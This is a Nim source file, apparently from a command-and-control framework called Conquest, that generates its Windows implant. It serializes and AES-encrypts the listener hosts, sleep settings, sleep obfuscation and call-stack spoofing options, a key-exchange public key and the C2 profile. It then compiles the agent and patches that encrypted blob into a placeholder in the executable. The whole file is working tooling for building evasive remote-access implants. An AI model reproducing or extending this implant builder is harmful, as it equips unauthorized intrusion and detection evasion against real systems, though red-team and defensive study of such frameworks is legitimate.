import terminal, strformat, strutils, sequtils, tables, system, osproc, streams, parsetoml

import ../globals
import ../core/[logger, websocket]
import ../db/database 
import ../../common/[types, utils, serialize, crypto]

const PLACEHOLDER = "PLACEHOLDER"

proc serializeConfiguration(cq: Conquest, listener: Listener, sleep: int, sleepTechnique: SleepObfuscationTechnique, spoofStack: bool): seq[byte] = 
    
    var packer = Packer.init()

    # Add listener configuration
    # Variable length data is prefixed with a 4-byte length indicator

    # Listener configuration
    packer.add(string.toUuid(listener.listenerId))
    packer.addDataWithLengthPrefix(string.toBytes(listener.hosts))

    # Sleep settings
    packer.add(uint32(sleep))
    packer.add(uint8(sleepTechnique))
    packer.add(uint8(spoofStack))

    # Public key for key exchange
    packer.addData(cq.keyPair.publicKey)

    # C2 profile
    packer.addDataWithLengthPrefix(string.toBytes(cq.profile.toTomlString()))

    let data = packer.pack() 
    packer.reset() 

    # Encrypt profile configuration data with a newly generated encryption key
    var aesKey = generateBytes(Key) 
    let iv = generateBytes(Iv)

    let (encData, gmac) = encrypt(aesKey, iv, data)

    # Add plaintext encryption material in front of the 
    packer.addData(aesKey)
    packer.addData(iv)
    packer.addData(gmac)
    packer.add(uint32(encData.len()))
    let encMaterial = packer.pack() 

    wipeKey(aesKey)

    cq.info("Profile configuration serialized.")
    cq.client.sendBuildlogItem(LOG_INFO_SHORT, "Profile configuration serialized.")

    return encMaterial & encData 

proc replaceAfterPrefix(content, prefix, value: string): string = 
    result = content.splitLines().mapIt(
        if it.startsWith(prefix):
            prefix & '"' & value & '"' 
        else: 
            it
    ).join("\n")
    
proc compile(cq: Conquest, placeholderLength: int, modules: uint32, verbose: bool): string = 
    
    let 
        configFile = fmt"{CONQUEST_ROOT}/src/agent/nim.cfg"  
        exeFile = fmt"{CONQUEST_ROOT}/bin/monarch.x64.exe" 
        agentBuildScript = fmt"{CONQUEST_ROOT}/src/agent/build.sh"    

    # Update conquest root directory in agent build script
    var buildScript = readFile(agentBuildScript).replaceAfterPrefix("CONQUEST_ROOT=", CONQUEST_ROOT)
    writeFile(agentBuildScript, buildScript)

    # Update placeholder and configuration values 
    let placeholder = PLACEHOLDER & "A".repeat(placeholderLength - (2 * len(PLACEHOLDER))) & PLACEHOLDER
    var config = readFile(configFile)
                    .replaceAfterPrefix("-d:CONFIGURATION=", placeholder)    
                    .replaceAfterPrefix("-o:", exeFile)
                    .replaceAfterPrefix("-d:MODULES=", $modules)
                    .replaceAfterPrefix("-d:VERBOSE=", $verbose)
    writeFile(configFile, config)

    cq.info(fmt"Placeholder created ({placeholder.len()} bytes).")
    cq.client.sendBuildlogItem(LOG_INFO_SHORT, fmt"Placeholder created ({placeholder.len()} bytes).")
    
    # Build agent by executing the ./build.sh script on the system.
    cq.info("Compiling agent.")
    cq.client.sendBuildlogItem(LOG_INFO_SHORT, "Compiling agent...")
    
    try:
        # Using the startProcess function from the 'osproc' module, it is possible to retrieve the output as it is received, line-by-line instead of all at once
        let process = startProcess(agentBuildScript, options={poUsePath, poStdErrToStdOut})
        let outputStream = process.outputStream

        var line: string
        while outputStream.readLine(line):
            cq.output(line) 

        let exitCode = process.waitForExit()

        # Check if the build succeeded or not
        if exitCode == 0:
            cq.info("Agent payload generated successfully.")
            cq.client.sendBuildlogItem(LOG_INFO_SHORT, "Agent payload generated successfully.")

            return exeFile
        else:
            cq.error("Build script exited with code ", $exitCode)
            cq.client.sendBuildlogItem(LOG_ERROR_SHORT, "Build script exited with code " & $exitCode)

            return ""

    except CatchableError as err:
        cq.error("An error occurred: ", err.msg)
        return ""
    
proc patch(cq: Conquest, unpatchedExePath: string, configuration: seq[byte]): seq[byte] = 
    
    cq.info("Patching profile configuration into agent.")
    cq.client.sendBuildlogItem(LOG_INFO_SHORT, "Patching profile configuration into agent.")

    try: 
        var exeBytes = readFile(unpatchedExePath) 

        # Find placeholder 
        let placeholderPos = exeBytes.find(PLACEHOLDER) 
        if placeholderPos == -1: 
            raise newException(CatchableError, "Placeholder not found.")
        
        cq.info(fmt"Placeholder found at offset 0x{placeholderPos:08X}.")
        cq.client.sendBuildlogItem(LOG_INFO_SHORT, fmt"Placeholder found at offset 0x{placeholderPos:08X}.")

        # Patch placeholder bytes
        for i, c in Bytes.toString(configuration): 
            exeBytes[placeholderPos + i] = c 

        writeFile(unpatchedExePath, exeBytes)

        cq.success(fmt"Agent payload patched successfully: {unpatchedExePath}.")
        cq.client.sendBuildlogItem(LOG_SUCCESS_SHORT, fmt"Agent payload patched successfully: {unpatchedExePath}.")
        return string.toBytes(exeBytes)
    
    except CatchableError as err:
        cq.error("An error occurred: ", err.msg) 
        cq.client.sendBuildlogItem(LOG_ERROR_SHORT, "An error occurred: " & err.msg)
        
    return @[]

# Agent generation 
proc agentBuild*(cq: Conquest, listenerId: string, sleepDelay: int, sleepTechnique: SleepObfuscationTechnique, spoofStack: bool, verbose: bool, modules: uint32): seq[byte] =

    # Verify that listener exists
    if not cq.dbListenerExists(listenerId.toUpperAscii): 
        cq.error(fmt"Listener {listenerId.toUpperAscii} does not exist.")
        return

    let listener = cq.listeners[listenerId.toUpperAscii]
    
    var config = cq.serializeConfiguration(listener, sleepDelay, sleepTechnique, spoofStack)
    
    let unpatchedExePath = cq.compile(config.len, modules, verbose)
    if unpatchedExePath.isEmptyOrWhitespace():
        return 

    # Return packet to send to client
    return cq.patch(unpatchedExePath, config)